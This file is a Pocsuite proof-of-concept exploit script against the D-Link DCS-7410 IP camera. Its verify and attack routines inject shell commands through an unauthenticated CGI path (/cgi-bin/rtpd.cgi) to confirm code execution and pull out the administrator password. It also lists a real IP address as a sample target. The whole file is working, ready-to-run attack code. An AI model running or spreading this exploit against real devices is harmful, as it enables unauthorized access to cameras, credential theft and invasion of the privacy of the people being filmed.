#!/usr/bin/env python
# coding: utf-8
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.utils import randomStr
import re
import hashlib
import urllib2


class TestPOC(POCBase):
    vulID = ''  # ssvid
    version = '1.0'
    author = ['Hcamael']
    vulDate = ''
    createDate = '2016-09-22'
    updateDate = '2016-09-22'
    references = ['']
    name = 'D-Link DCS IP camera 7410 command execution'
    appPowerLink = ''
    appName = 'D-Link DCS IP camera'
    appVersion = '7410'
    vulType = 'command exec'
    desc = '''
        D-Link DCS IP摄像头, /cgi-bin/rtpd.cgi可以未授权访问, 该路径存在命令执行漏洞, 通过命令执行可以获取管理员账号密码, 登入后台, 查看摄像头
    '''
    samples = ['58.176.101.87']
    install_requires = ['re', 'hashlib', 'urllib2']

    # 请尽量不要使用第三方库，必要时参考 https://github.com/knownsec/Pocsuite/blob/master/docs/CODING.md#poc-第三方模块依赖说明 填写该字段

    def m_attack(self):
        result = {}
        payload = '/cgi-bin/rtpd.cgi?echo&AdminPasswd_ss|tdb&get&HTTPAccount'
        re_pattern = re.compile(r'AdminPasswd_ss="(.*)"', re.I | re.M | re.DOTALL)
        request = urllib2.urlopen(self.url + payload)
        content = request.read()
        if 'Usage: rtpd.cgi' in content:
            data = re_pattern.findall(content)
            if data:
                data = data[0]
                result['AdminInfo'] = {}
                result['AdminInfo']['username'] = 'admin'
                result['AdminInfo']['password'] = data
        return result

    def _attack(self):
        result = self.m_attack()
        return self.parse_output(result)

    def _verify(self):
        result = {}
        verify_str = randomStr()
        verify_url = "/cgi-bin/rtpd.cgi?echo&%s|md5sum" % verify_str

        r = urllib2.urlopen(self.url + verify_url)
        content = r.read()
        if 'Usage: rtpd.cgi' in content and hashlib.md5(verify_str + "\n").hexdigest() in content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['path'] = verify_url
            result.update(self.m_attack())
        return self.parse_output(result)

    def parse_output(self, result):
        # parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)